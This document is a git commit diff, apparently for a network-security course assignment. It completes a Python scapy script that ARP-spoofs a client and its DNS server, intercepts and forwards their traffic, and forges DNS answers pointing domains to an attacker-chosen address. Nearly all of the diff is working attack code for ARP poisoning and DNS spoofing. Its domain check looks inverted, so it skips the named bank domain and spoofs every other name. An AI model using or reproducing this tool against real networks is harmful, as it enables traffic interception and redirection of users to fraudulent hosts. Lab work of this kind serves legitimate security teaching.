9348cf72b09d67c961a4bb03c76df9c5af27b72e
aa <aa@aa.com>
2021-04-20 22:36:21 +0800

    Add 2.1.dns

--- NetSec/cp2.1.dns.py
+++ NetSec/cp2.1.dns.py
@@ -1,9 +1,7 @@
-# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
+#!/usr/bin/env python3
 from scapy.all import *
 
 import argparse
-import os
-import re
 import sys
 import threading
 import time
@@ -12,8 +10,8 @@ def parse_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
     parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
-    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
-    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=1, type=int)
+    parser.add_argument("-ip3", "--serverIP", help="IP of the server", required=True)
+    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
     return parser.parse_args()
 
 
@@ -26,31 +24,76 @@ def debug(s):
 
 # TODO: returns the mac address for an IP
 def mac(IP):
-    return
+    arp_request = ARP(op=1, pdst=IP, hwdst='ff:ff:ff:ff:ff:ff')
+    resp = sr1(arp_request)
+    return resp[ARP].hwsrc
 
 
-def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
+#ARP spoofs client, dnsServer
+def spoof_thread(clientIP, clientMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
     while True:
-        spoof() # TODO: Spoof client ARP table
-        spoof() # TODO: Spoof server ARP table
+        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
+        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # TODO: Spoof dnsServer ARP table
         time.sleep(interval)
 
 
 # TODO: spoof ARP so that dst changes its ARP table entry for src 
 def spoof(srcIP, srcMAC, dstIP, dstMAC):
-    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
+    # debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
+    gratuitous_arp = ARP(op=2, psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC)
+    send(gratuitous_arp)
 
 
 # TODO: restore ARP so that dst changes its ARP table entry for src
 def restore(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"restoring ARP table for {dstIP}")
+    spoof(srcIP, srcMAC, dstIP, dstMAC)
 
+def fakedns(packet):
+    try:
+        qname = packet[DNSQR].qname
+        debug(f'{qname}')
+        if qname == 'www.bankofbailey.com':
+            debug('Not our target domain')
+            return packet
+        packet[DNS].an = DNSRR(rrname=qname, rdata='10.4.63.200')
+        packet[DNS].ancount = 1
+        del packet[IP].len
+        del packet[IP].chksum
+        del packet[UDP].len
+        del packet[UDP].chksum
+        return packet
+    except Exception as e:
+        debug(f'Error in fakedns: {e}')
+        return packet
 
-# TODO: handle intercepted packets
+def handle_packet(p):
+    global clientMAC, clientIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
+    try:
+        if p[Ether].src == attackerMAC: # Ignore our own spoofing packages
+            return;
+        debug(f'Sniffed: {p.summary()}')
+
+        if p.haslayer(DNSRR):
+            p=fakedns(p)
+            debug(f'DNS modified: {p.summary()}')
+
+        p[Ether].src=attackerMAC
+        if p[IP].dst == dnsServerIP: p[Ether].dst = dnsServerMAC
+        if p[IP].dst == clientIP: p[Ether].dst = clientMAC
+        sendp(p, iface=conf.iface)
+    except Exception as e:
+        debug(f'Error when sniffing: {e}')
+    pass
+
 # NOTE: this intercepts all packets that are sent AND received by the attacker, so 
 # you will want to filter out packets that you do not intend to intercept and forward
 def interceptor(packet):
-    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
+    global clientMAC, clientIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
+    bpf = (f"(dst host {clientIP}) or ((src host {clientIP} and ((dst host {dnsServerIP}))))")
+    debug(f'Sniffer use BPF: {bpf}')
+    sniff(store=0, filter=bpf, prn=handle_packet,
+            stop_filter=lambda x: False, iface=conf.iface)
 
 
 if __name__ == "__main__":
@@ -61,15 +104,15 @@ if __name__ == "__main__":
     conf.iface = args.interface # set default interface
 
     clientIP = args.clientIP
-    serverIP = args.serverIP
+    dnsServerIP = args.serverIP
     attackerIP = get_if_addr(args.interface)
 
     clientMAC = mac(clientIP)
-    serverMAC = mac(serverIP)
+    dnsServerMAC = mac(dnsServerIP)
     attackerMAC = get_if_hwaddr(args.interface)
 
     # start a new thread to ARP spoof in a loop
-    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
+    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
     spoof_th.start()
 
     # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
@@ -80,9 +123,9 @@ if __name__ == "__main__":
         while True:
             pass
     except KeyboardInterrupt:
-        restore(clientIP, clientMAC, serverIP, serverMAC)
-        restore(serverIP, serverMAC, clientIP, clientMAC)
+        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
+        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
         sys.exit(1)
 
-    restore(clientIP, clientMAC, serverIP, serverMAC)
-    restore(serverIP, serverMAC, clientIP, clientMAC)
+    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
+    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
